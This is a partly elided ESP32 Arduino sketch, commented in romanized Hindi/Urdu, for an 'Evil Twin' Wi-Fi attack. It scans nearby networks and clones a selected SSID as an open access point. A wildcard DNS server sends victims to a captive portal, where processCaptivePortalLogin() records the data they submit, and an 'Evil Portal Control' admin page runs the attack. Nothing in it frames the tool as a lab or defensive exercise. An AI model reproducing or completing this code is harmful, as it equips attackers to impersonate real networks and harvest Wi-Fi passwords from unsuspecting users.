...
#include <SPIFFS.h>
#include <esp_wifi.h>
#include <Adafruit_NeoPixel.h> // Onboard RGB LED ke liye library

// --- RGB LED CONFIGURATION ---
#define LED_PIN        48  // ESP32-S3 Dev Module par aam tor par GPIO 48 hota hai (agar kaam na kare toh 38 karein)
#define NUMPIXELS      1   
Adafruit_NeoPixel rgbLed(NUMPIXELS, LED_PIN, NEO_GRB + NEO_KHZ800);
...
void performScan() {
  setLedColor(0, 0, 150); // Scanning ke dauran LED Blue ho jayegi
  int n = WiFi.scanNetworks(false, true); 
  delay(10); // Processor ko break dein
  networks.clear();
  if (n > 0) { 
    for (int i = 0; i < n && i < 20; ++i) { 
      ...
      yield(); // Core crash se bachane ke liye critical line
    } 
  }
  WiFi.scanDelete();
  if(hotspotActive) setLedColor(150, 0, 0); else setLedColor(0, 150, 0); // Wapas purani state badge
}
...
void startEvilTwin() {
  ...
  if (WiFi.softAP(selectedNetwork.ssid.c_str(), NULL, selectedNetwork.ch)) {
    ...
    dnsServer.stop(); delay(50);
    dnsServer.start(DNS_PORT, "*", apIP);
    setLedColor(150, 0, 0); // Attack Mode active par LED Red ho jayegi
...
void stopEvilTwin() {
  ...
  setLedColor(0, 150, 0); // Standby state par LED Green ho jayegi
  Serial.println("\n[-] EVIL TWIN STOPPED");
}

void processCaptivePortalLogin() {
  setLedColor(150, 150, 0); // Data capture hote hi LED Yellow ho jayegi
  ...
  if (capturedData == "") capturedData = "[Unknown Data Format]";
  ...
  delay(100);
  setLedColor(150, 0, 0); // Wapas Attack state (Red)
}

// --- HANDLERS ---
void handleAdmin() {
  String html = String(FPSTR(HEADER_TEMPLATE)); html.replace("%TITLE%", "Admin");
  html += "<div class='header'><h1>Evil Portal Control</h1>";
...
void setup() {
  ...
  // RGB LED Setup
  rgbLed.begin();
  rgbLed.setBrightness(50); // Bohat tez roshni na ho is liye brightness 50% ki hai
  setLedColor(255, 255, 255); // Starting up par White Light chalegi
  ...
  setLedColor(0, 150, 0); // Setup end hote hi LED Green ho jayegi (System Stable)
  performScan();
}
...
void loop() {
  ...
  // Watchdog reset ko internal break dene ke liye chota sa delay
  delay(2); 

  if (millis() - lastScan > SCAN_INTERVAL && !hotspotActive) { 
    performScan(); 
    lastScan = millis(); 
  }
}